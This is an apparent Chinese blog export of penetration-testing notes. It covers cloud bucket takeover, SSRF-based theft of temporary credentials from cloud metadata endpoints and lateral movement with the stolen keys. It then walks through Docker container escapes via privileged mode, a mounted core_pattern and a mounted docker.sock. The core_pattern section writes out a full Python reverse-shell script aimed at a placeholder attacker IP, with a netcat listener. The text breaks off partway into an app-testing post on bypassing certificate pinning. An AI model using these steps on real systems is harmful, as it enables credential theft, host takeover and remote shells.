alt="image">​</p><p>Bucket存储桶绑定域名后，当存储桶被删除而域名解析未删除，可以尝试接管！(自己去新建一个存储桶，然后去绑定这个域名从而实现接管)</p><p>当Bucket显示<code>NoSuchBucket</code>​说明是可以接管的，如果显示<code>AccessDenied</code>​则不行（这个是根据自己把存储桶删除得到的）</p><p><img src="/assets/image-20241014172211-ivmr9cj.png" alt="image">​</p><p><img src="/assets/image-20241014172231-sv4bsut.png" alt="image">​</p><p><img src="/assets/image-20241014172242-kt4z15p.png" alt="image">​</p><p>注意，新建一个OSS桶的时候，对方用的什么云存储桶你就用什么云存储桶，对方存储桶地域是什么，新建的时候也要选择对应的地域。</p><p>‍</p><p>‍</p><h3 id="fofa实战"><a href="#fofa实战" class="headerlink" title="fofa实战"></a>fofa实战</h3><p><img src="/assets/image-20241014172459-c7ztiz6.png" alt="image">​</p><p><img src="/assets/image-20241014172509-fpct2ze.png" alt="image">​</p><p><img src="/assets/image-20241014172615-g49ls0i.png" alt="image">​</p><p><img src="/assets/image-20241014172626-xiqu90y.png" alt="image">​</p><p>尝试上传文件</p><p><img src="/assets/image-20241014172650-hz0m7d8.png" alt="image">​</p><p><img src="/assets/image-20241014172709-8yeh4h3.png" alt="image">​</p><p>然后将sysvod.oss-cn-shenzhen.aliyuncs.com绑定一个域名，这样别人访问该域名时就能展示你的桶的数据</p><p>‍</p><h2 id="弹性计算服务器-元数据"><a href="#弹性计算服务器-元数据" class="headerlink" title="弹性计算服务器-元数据"></a>弹性计算服务器-元数据</h2><p>元数据解释<br>    实例元数据（metadata）包含了弹性计算云服务器实例在阿里云系统中的信息，您可以在运行中的实例内方便地查看实例元数据，并基于实例元数据配置或管理实例。（基本信息：实例ID、IP地址、网卡MAC地址、操作系统类型等信息。实例标识包括实例标识文档和实例标识签名，所有信息均实时生成，常用于快速辨别实例身份。）</p><p>各大云元数据地址</p><blockquote><p>阿里云元数据地址：<a href="http://100.100.100.200/">http://100.100.100.200/</a><br>腾讯云元数据地址：<a href="http://metadata.tencentyun.com/">http://metadata.tencentyun.com/</a><br>华为云元数据地址：<a href="http://169.254.169.254/">http://169.254.169.254/</a><br>亚马云元数据地址：<a href="http://169.254.169.254/">http://169.254.169.254/</a><br>微软云元数据地址：<a href="http://169.254.169.254/">http://169.254.169.254/</a><br>谷歌云元数据地址：<a href="http://metadata.google.internal/">http://metadata.google.internal/</a></p></blockquote><p>细节方面可通过访问官网找元数据访问触发说明<br>阿里云例子：<a href="https://help.aliyun.com/zh/ecs/user-guide/manage-instance-metadata">https://help.aliyun.com/zh/ecs/user-guide/manage-instance-metadata</a></p><p><img src="/assets/image-20241014174833-cbm2sdh.png" alt="image">​</p><p>腾讯云例子：<a href="https://cloud.tencent.com/document/product/213/4934">https://cloud.tencent.com/document/product/213/4934</a></p><p><img src="/assets/image-20241014174850-mxisbie.png" alt="image">​</p><p>‍</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>弹性计算服务器配置访问控制角色</p><p><img src="/assets/image-20241014180750-xkrpms3.png" alt="image">​</p><p><img src="/assets/image-20241014180801-sgn4n8n.png" alt="image">​</p><p><img src="/assets/image-20241014180816-zwj7yea.png" alt="image">​</p><p><img src="/assets/image-20241014180920-hxo6ia8.png" alt="image">​</p><p><img src="/assets/image-20241014180948-dt6zpru.png" alt="image">​</p><p><img src="/assets/image-20241014181025-seqa7pf.png" alt="image">​</p><p><img src="/assets/image-20241014181041-e21n6qs.png" alt="image">​</p><p><img src="/assets/image-20241014181111-enxgouo.png" alt="image">​</p><p><img src="/assets/image-20241014181125-42hggsi.png" alt="image">​</p><p>‍</p><h3 id="SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发url）"><a href="#SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发url）" class="headerlink" title="SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发url）"></a>SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发url）</h3><p>获取关键角色信息</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">curl http://100.100.100.200/latest/meta-data/<br>curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<br>curl http://100.100.100.200/latest/meta-data/ram/security-credentials/ecs<br></code></pre></td></tr></table></figure><p><img src="/assets/image-20241014181352-fn8homp.png" alt="image">​</p><p><img src="/assets/image-20241014181408-zuqu0ng.png" alt="image">​<img src="/assets/image-20241014181409-rpevi9i.png" alt="image">​</p><p>利用AK横向移动<br>CF 云渗透框架项目：<a href="https://wiki.teamssix.com/CF/">https://wiki.teamssix.com/CF/</a></p><p><img src="/assets/image-20241014181623-g9r4zfp.png" alt="image">​</p><p>狐狸工具箱有cf</p><p><img src="/assets/image-20241014181707-ozt3eep.png" alt="image">​</p><ol><li><p>先配置云服务商的访问密钥</p><p> <code>cf config</code>​</p><p> <img src="/assets/image-20241014181800-hmhl93x.png" alt="image">​</p><p> <img src="/assets/image-20241014181812-bdtnmm9.png" alt="image">​</p></li><li><p>获取控制台</p><p> <img src="/assets/image-20241014181907-m243kyt.png" alt="image">​</p><p> <img src="/assets/image-20241014182045-bduargf.png" alt="image">​</p><p> <img src="/assets/image-20241014182105-tjk5n6h.png" alt="image">​</p></li><li><p>获取所有的ecs服务器</p><p> <img src="/assets/image-20241014182132-rgskhf1.png" alt="image">​</p><p> <img src="/assets/image-20241014182144-cxa80ey.png" alt="image">​</p></li><li><p>执行命令(需要先获取ecs服务器)</p><p> <img src="/assets/image-20241014182217-hb3xxtg.png" alt="image">​</p></li><li><p>获取所有oss存储桶</p><p> <img src="/assets/image-20241014182248-sf781zm.png" alt="image">​</p><p> <img src="/assets/image-20241014182259-6b6if0e.png" alt="image">​</p></li></ol><h3 id="某服务器上Web资产存在SSRF漏洞"><a href="#某服务器上Web资产存在SSRF漏洞" class="headerlink" title="某服务器上Web资产存在SSRF漏洞"></a>某服务器上Web资产存在SSRF漏洞</h3><p><img src="/assets/image-20241014182346-249o6rf.png" alt="image">​</p><p>获取关键角色信息</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">curl http://100.100.100.200/latest/meta-data/<br>curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<br></code></pre></td></tr></table></figure><p>获取ecs临时凭证</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">curl http://100.100.100.200/latest/meta-data/ram/security-credentials/ecs<br></code></pre></td></tr></table></figure><p><img src="/assets/image-20241014182433-c5mjxts.png" alt="image">​</p><p>利用AK横向移动</p><p>CF 云渗透框架项目：<a href="https://wiki.teamssix.com/CF/">https://wiki.teamssix.com/CF/</a></p><p>‍</p><p>‍</p><p>‍</p><h1 id="云原生"><a href="#云原生" class="headerlink" title="云原生"></a>云原生</h1><p>‍</p><h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><p>‍</p><h3 id="Docker概念"><a href="#Docker概念" class="headerlink" title="Docker概念"></a>Docker概念</h3><p>一个容器技术，类似于VM虚拟机，别人环境封装好打包成一个镜像，使用docker技术就能快速把这个镜像环境还原出来。</p><p>‍</p><h3 id="为什么要进行Docker逃逸？"><a href="#为什么要进行Docker逃逸？" class="headerlink" title="为什么要进行Docker逃逸？"></a>为什么要进行Docker逃逸？</h3><p>攻击者攻击虚拟空间磁盘，拿到最高权限也是虚拟空间的权限，而不是真实物理环境的权限</p><p><img src="/assets/image-20241018113341-81qbigr.png" alt="image">​</p><p>‍</p><h3 id="前渗透-判断是否在容器内"><a href="#前渗透-判断是否在容器内" class="headerlink" title="前渗透-判断是否在容器内"></a>前渗透-判断是否在容器内</h3><p>‍</p><p>前提—拿到权限</p><p>‍</p><h4 id="法一：查询cgroup信息"><a href="#法一：查询cgroup信息" class="headerlink" title="法一：查询cgroup信息"></a>法一：查询cgroup信息</h4><p>通过响应的内容可以识别当前进程所处的运行环境，就可以知道是在虚拟机、docker还是kubepods里。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/1/cgroup<br></code></pre></td></tr></table></figure><p>docker 环境下</p><p><img src="/assets/image-20241018113951-zuko2fy.png" alt="image">​</p><p>K8s环境下</p><p><img src="/assets/image-20241018114002-4wqm6mc.png" alt="image">​</p><p>虚拟机环境下</p><p><img src="/assets/image-20241018114633-aot4zry.png" alt="image">​</p><p>‍</p><h4 id="法二：检查-dockerenv文件"><a href="#法二：检查-dockerenv文件" class="headerlink" title="法二：检查&#x2F;.dockerenv文件"></a>法二：检查&#x2F;.dockerenv文件</h4><p>通过判断根目录下的 .dockerenv文件是否存在，可以简单的识别docker环境。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls -alh /.dockerenv <br></code></pre></td></tr></table></figure><p>K8s&amp;docker环境下：ls -alh &#x2F;.dockerenv 可以找到文件</p><p>虚拟机环境下：是没有这个.dockerenv文件的</p><p><img src="/assets/image-20241018115133-q1nubq9.png" alt="image">​</p><p>‍</p><h4 id="法三：检查mount信息"><a href="#法三：检查mount信息" class="headerlink" title="法三：检查mount信息"></a>法三：检查mount信息</h4><p>利用mount查看挂载磁盘是否存在docker相关信息</p><p>K8s&amp;docker环境下</p><p><img src="/assets/image-20241018115303-ark4wb0.png" alt="image">​</p><p>虚拟机环境下</p><p><img src="/assets/image-20241018115320-evypsq9.png" alt="image">​</p><p>‍</p><h4 id="法四：查看端口运行情况"><a href="#法四：查看端口运行情况" class="headerlink" title="法四：查看端口运行情况"></a>法四：查看端口运行情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netstat -anpt<br></code></pre></td></tr></table></figure><p><img src="/assets/image-20241018120226-ejmzho3.png" alt="image">​</p><p>‍</p><h4 id="法五：查看硬盘信息"><a href="#法五：查看硬盘信息" class="headerlink" title="法五：查看硬盘信息"></a>法五：查看硬盘信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fdisk -l<br></code></pre></td></tr></table></figure><p>Docker输出为空，非Docker就会有内容输出</p><p>K8s&amp;docker环境下</p><p><img src="/assets/image-20241018120901-oa1qwd8.png" alt="image">​</p><p>虚拟机环境下</p><p><img src="/assets/image-20241018120935-sa26ps3.png" alt="image">​</p><p>‍</p><h4 id="法六：查看文件系统以及挂载点"><a href="#法六：查看文件系统以及挂载点" class="headerlink" title="法六：查看文件系统以及挂载点"></a>法六：查看文件系统以及挂载点</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">df -h<br></code></pre></td></tr></table></figure><p>检查文件系统挂载的目录，也能够简单判断是否为docker环境</p><p>K8s&amp;docker环境下</p><p><img src="/assets/image-20241018121313-67fk0cj.png" alt="image">​</p><p>虚拟机环境下</p><p><img src="/assets/image-20241018121337-wvj6sgi.png" alt="image">​</p><p>‍</p><h3 id="后渗透-三种安全容器逃逸"><a href="#后渗透-三种安全容器逃逸" class="headerlink" title="后渗透-三种安全容器逃逸"></a>后渗透-三种安全容器逃逸</h3><p>‍</p><h4 id="Privileged特权模式启动"><a href="#Privileged特权模式启动" class="headerlink" title="Privileged特权模式启动"></a>Privileged特权模式启动</h4><p><code>不安全启动，适用于java jsp高权限入口无需提权 低权限入口还要提权才能逃逸</code>​</p><ol><li><h5 id="以特权模式启动靶场"><a href="#以特权模式启动靶场" class="headerlink" title="以特权模式启动靶场"></a>以特权模式启动靶场</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run --rm --privileged=true -it alpine<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20241018124030-w62meyo.png" alt="image">​</p></li><li><h5 id="检测是否是docker环境"><a href="#检测是否是docker环境" class="headerlink" title="检测是否是docker环境"></a>检测是否是docker环境</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;<br><br>根据上面的笔记可以一个一个尝试，不要死脑筋<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20241018125651-k83yxjp.png" alt="image">​</p></li><li><h5 id="判断是否是特权模式"><a href="#判断是否是特权模式" class="headerlink" title="判断是否是特权模式"></a>判断是否是特权模式</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/self/status | grep CapEff<br>或<br>cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;<br></code></pre></td></tr></table></figure><p> 在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</p><p> <img src="/assets/image-20241018130120-wl6o4fz.png" alt="image">​</p></li><li><h5 id="查看挂载磁盘设备"><a href="#查看挂载磁盘设备" class="headerlink" title="查看挂载磁盘设备"></a>查看挂载磁盘设备</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fdisk -l<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20241018133847-9vwd0pe.png" alt="image">​</p></li><li><h5 id="特权模式逃逸"><a href="#特权模式逃逸" class="headerlink" title="特权模式逃逸"></a>特权模式逃逸</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir /test &amp;&amp; mount /dev/sda1 /test<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20241018133806-b0gqjcs.png" alt="image">​</p></li><li><h5 id="访问宿主机shadow文件"><a href="#访问宿主机shadow文件" class="headerlink" title="访问宿主机shadow文件"></a>访问宿主机shadow文件</h5><p> 宿主机的 <code>shadow</code>​ 文件主要用于存储用户的密码信息，但它并不直接保存明文密码。</p><p> <img src="/assets/image-20241018134139-q0rvfub.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h4 id="危险挂载启动"><a href="#危险挂载启动" class="headerlink" title="危险挂载启动"></a>危险挂载启动</h4><p><code>危险启动，适用于java jsp高权限入口无需提权 低权限入口还要提权才能逃逸</code>​</p><h5 id="挂载Procfs"><a href="#挂载Procfs" class="headerlink" title="挂载Procfs"></a>挂载Procfs</h5><ol><li><h6 id="创建一个容器并挂载-proc-目录"><a href="#创建一个容器并挂载-proc-目录" class="headerlink" title="创建一个容器并挂载 &#x2F;proc 目录"></a>创建一个容器并挂载 &#x2F;proc 目录</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20241018160550-btckga3.png" alt="image">​</p></li><li><h6 id="检测环境"><a href="#检测环境" class="headerlink" title="检测环境"></a>检测环境</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name core_pattern<br></code></pre></td></tr></table></figure><p> 如果找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs</p><p> <img src="/assets/image-20241018160749-jnk4itz.png" alt="image">​</p></li><li><h6 id="找到当前容器在宿主机下的绝对路径"><a href="#找到当前容器在宿主机下的绝对路径" class="headerlink" title="找到当前容器在宿主机下的绝对路径"></a>找到当前容器在宿主机下的绝对路径</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/mounts | grep workdir<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20241018160911-yeawyso.png" alt="image">​</p></li><li><h6 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h6><p> 直接复制粘贴到命令行</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat &gt;/tmp/.x.py &lt;&lt; EOF<br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/usr/bin/python</span><br>import os<br>import pty<br>import socket<br>lhost = &quot;xx.xx.xx.xx&quot;  //反弹IP<br>lport = xxxx //反弹端口<br>def main():<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((lhost, lport))<br>    os.dup2(s.fileno(), 0)<br>    os.dup2(s.fileno(), 1)<br>    os.dup2(s.fileno(), 2)<br>    os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)<br>    pty.spawn(&quot;/bin/bash&quot;)<br>    os.remove(&#x27;/tmp/.x.py&#x27;)<br>    s.close()<br>if __name__ == &quot;__main__&quot;:<br>    main()<br>EOF<br></code></pre></td></tr></table></figure><p> 检测是否写入文件</p><p> <img src="/assets/image-20241018161329-8a6szgj.png" alt="image">​</p><p> 给文件权限</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod +x /tmp/.x.py<br></code></pre></td></tr></table></figure><p> 将刚才的绝对路径复制过来</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e &quot;|/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged/tmp/.x.py \rcore           &quot; &gt; /host/proc/sys/kernel/core_pattern<br>//这里的路径要替换为workdir的绝对路径<br></code></pre></td></tr></table></figure><p> 写入文件</p><p> 直接复制粘贴到命令行</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat &gt;/tmp/x.c &lt;&lt; EOF<br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span><br>int main(void)<br>&#123;<br>    int *a = NULL;<br>    *a = 1;<br>    return 0;<br>&#125;<br>EOF<br></code></pre></td></tr></table></figure></li><li><h6 id="编译文件并执行"><a href="#编译文件并执行" class="headerlink" title="编译文件并执行"></a>编译文件并执行</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp<br>gcc x.c -o x  //编译c文件<br></code></pre></td></tr></table></figure> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update -y &amp;&amp; apt-get install  gcc -y <br>//实战中不推荐安装gcc环境，可以在linux上编译好后上传到容器中执行就行<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20241018162240-pmmvjep.png" alt="image">​</p><p> 执行文件</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./x  <br></code></pre></td></tr></table></figure><p> 此时攻击机记得监听端口</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp xxxx<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><h5 id="挂载Socket"><a href="#挂载Socket" class="headerlink" title="挂载Socket"></a>挂载Socket</h5><ol><li><h6 id="创建一个容器并挂载-var-run-docker-sock-文件"><a href="#创建一个容器并挂载-var-run-docker-sock-文件" class="headerlink" title="创建一个容器并挂载 &#x2F;var&#x2F;run&#x2F;docker&#x2F;sock 文件"></a>创建一个容器并挂载 &#x2F;var&#x2F;run&#x2F;docker&#x2F;sock 文件</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu<br></code></pre></td></tr></table></figure></li><li><h6 id="进入环境"><a href="#进入环境" class="headerlink" title="进入环境"></a>进入环境</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it with_docker_sock /bin/bash<br>这条命令是进入命令行，实战中用不到，这里是为了模拟环境<br></code></pre></td></tr></table></figure></li><li><h6 id="检测是否存在漏洞特征文件"><a href="#检测是否存在漏洞特征文件" class="headerlink" title="检测是否存在漏洞特征文件"></a>检测是否存在漏洞特征文件</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls -lah /var/run/docker.sock<br></code></pre></td></tr></table></figure><p> 如果存在这个文件，说明漏洞可能存在</p><p> <img src="/assets/image-20241018163047-wd4xsiz.png" alt="image">​</p></li><li><h6 id="挂载逃逸"><a href="#挂载逃逸" class="headerlink" title="挂载逃逸"></a>挂载逃逸</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update<br>apt-get install curl<br>curl -fsSL https://get.docker.com/ | sh<br><br>第三条命令就是在官网安装ubuntu，这里我的kali没有配置代理，用的下面的命令（配置了国内镜像源）<br>apt-get install docker-ce<br></code></pre></td></tr></table></figure><h6 id="在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部"><a href="#在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部" class="headerlink" title="在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部"></a>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</h6> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it -v /:/host ubuntu /bin/bash<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20241018164931-t6dz002.png" alt="image">​</p><p> 退出也需要两次</p><p> <img src="/assets/image-20241019113721-ynoe7dq.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><h4 id="docker自身版本漏洞-系统内核漏洞"><a href="#docker自身版本漏洞-系统内核漏洞" class="headerlink" title="docker自身版本漏洞&amp;系统内核漏洞"></a>docker自身版本漏洞&amp;系统内核漏洞</h4><p><code>软件版本漏洞和系统漏洞 高低权限都可用</code>​</p><p>主要是CVE复现</p><p>这里附上自动化项目</p><p><a href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></p><p>注：不支持系统内核漏洞！！</p><p><img src="/assets/image-20241018165529-bff7isi.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><h2 id="K8s安全"><a href="#K8s安全" class="headerlink" title="K8s安全"></a>K8s安全</h2><p>这里环境出问题了，之后看搭建视频重新搭一下</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>云上攻防、</category>
      
    </categories>
    
    
    <tags>
      
      <tag>云上攻防</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>APP攻防</title>
    <link href="/2024/09/15/APP%E6%94%BB%E9%98%B2/"/>
    <url>/2024/09/15/APP%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="APP攻防"><a href="#APP攻防" class="headerlink" title="APP攻防"></a>APP攻防</h1><p>‍</p><p>测试环境：<a href="https://github.com/AndroidAppSec/vuls">https://github.com/AndroidAppSec/vuls</a></p><p>‍</p><h1 id="综合分析"><a href="#综合分析" class="headerlink" title="综合分析"></a>综合分析</h1><h2 id="Mobexler"><a href="#Mobexler" class="headerlink" title="Mobexler"></a>Mobexler</h2><ul><li>Mobexler 是基于 Elementary OS 的定制虚拟机，旨在帮助进行 Android 和 iOS 应用程序的渗透测试。Mobexler 预装了各种开源工具，脚本，黑客必备软件等，这些都是安全测试 Android 和 iOS 应用程序所必需的。其中就包含自带了 MobSF。</li><li>官网地址：<a href="https://mobexler.com/">https://mobexler.com/</a></li></ul><p>‍</p><h2 id="MobSF"><a href="#MobSF" class="headerlink" title="MobSF"></a>MobSF</h2><p>可以使用项目一键搭建</p><ul><li>f8x 项目地址：<a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a></li><li>功能很强，可以搭建很多环境，详细见项目 GitHub 地址</li></ul><p>‍</p><p>‍</p><h1 id="抓包突破"><a href="#抓包突破" class="headerlink" title="抓包突破"></a>抓包突破</h1><h2 id="无限制过滤抓包"><a href="#无限制过滤抓包" class="headerlink" title="无限制过滤抓包"></a>无限制过滤抓包</h2><p>‍</p><h3 id="配置证书"><a href="#配置证书" class="headerlink" title="配置证书"></a>配置证书</h3><p>burp证书配置<a href="https://blog.csdn.net/m0_61154780/article/details/137027103?spm=1001.2014.3001.5506">Burp Suite抓包逍遥模拟器与安装证书_逍遥模拟器安装证书-CSDN博客</a></p><p>‍</p><h3 id="非http协议"><a href="#非http协议" class="headerlink" title="非http协议"></a>非http协议</h3><p>使用封包监听工具</p><p>‍</p><p>‍</p><h2 id="有限制过滤抓包"><a href="#有限制过滤抓包" class="headerlink" title="有限制过滤抓包"></a>有限制过滤抓包</h2><p>‍</p><h3 id="反模拟器"><a href="#反模拟器" class="headerlink" title="反模拟器"></a>反模拟器</h3><p>禁用模拟器进行调试访问</p><p><img src="/assets/image-20240929155949-3olu7hy.png" alt="image">​</p><p>‍</p><h4 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h4><h5 id="1、用真机"><a href="#1、用真机" class="headerlink" title="1、用真机"></a>1、用真机</h5><h5 id="2、模拟器设置配置好来模拟真机"><a href="#2、模拟器设置配置好来模拟真机" class="headerlink" title="2、模拟器设置配置好来模拟真机"></a>2、模拟器设置配置好来模拟真机</h5><h5 id="3、逆向删反代码重打包"><a href="#3、逆向删反代码重打包" class="headerlink" title="3、逆向删反代码重打包"></a>3、逆向删反代码重打包</h5><p>‍</p><p>‍</p><h3 id="反证书检验"><a href="#反证书检验" class="headerlink" title="反证书检验"></a>反证书检验</h3><p>SSL证书绑定（单向校验和双向校验）<br>单项校验-客户端校验服务端的证书。<br>双向认证-客户端不仅仅要校验服务端的证书，也会在app内放一张证书；服务端也会检验客户端里的证书。</p><p>‍</p><h4 id="绕过方法：-1"><a href="#绕过方法：-1" class="headerlink" title="绕过方法："></a>绕过方法：</h4><h5 id="单向-XP框架"><a href="#单向-XP框架" class="headerlink" title="单向-XP框架"></a>单向-XP框架</h5><h6 id="本地demo演示"><a href="#本地demo演示" class="headerlink" title="本地demo演示"></a>本地demo演示</h6><p><img src="/assets/image-20240929160506-q2fus4e.png" alt="image">​</p><p><img src="/assets/image-20240929160711-kzutixt.png" alt="image">​</p><p><img src="/assets/image-20240929160814-1cxilaw.png" alt="image">​</p><h6 id="绕过步骤"><a href="#绕过步骤" class="headerlink" title="绕过步骤"></a>绕过步骤</h6><p>Xposed框架（注意！！！逍遥模拟器版本不要太高，这里用的8.12）</p><p><img src="/assets/image-20240929161313-wbguigo.png" alt="image">​</p><p><img src="/assets/image-20240929161453-1331njn.png" alt="image">​</p><p><img src="/assets/image-20240929161516-svj6e4w.png" alt="image">​</p><p><img src="/assets/image-20240929161548-sylrr4r.png" alt="image">​</p><p>打开安装好的文件管理器(不要用APP自带的文件管理器)</p><p><img src="/assets/image-20240929161625-0jrjtwr.png" alt="image">​</p><p><img src="/assets/image-20240929161637-mde602q.png" alt="image">​</p><p>移动到&#x2F;system目录下</p><p><img src="/assets/image-20240929161723-6rznwt6.png" alt="image">​</p><p><img src="/assets/image-20240929161743-tk2dkxr.png" alt="image">​</p><p><img src="/assets/image-20240929161757-68g7fre.png" alt="image">​</p><p><img src="/assets/image-20240929161042-flonpl9.png" alt="image">​</p><p><img src="/assets/image-20240929161054-cswz821.png" alt="image">​</p><p><img src="/assets/image-20240929161150-rhu2849.png" alt="image">​</p><p>‍</p><h5 id="双向"><a href="#双向" class="headerlink" title="双向"></a>双向</h5><h6 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h6><ol><li><p>本地安装 Frida</p> <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">pip install frida<br>pip install frida-tools<br>pip list #可以查看已经按照的库，查看frida的版本为<span class="hljs-number">16</span>.<span class="hljs-number">1</span>.<span 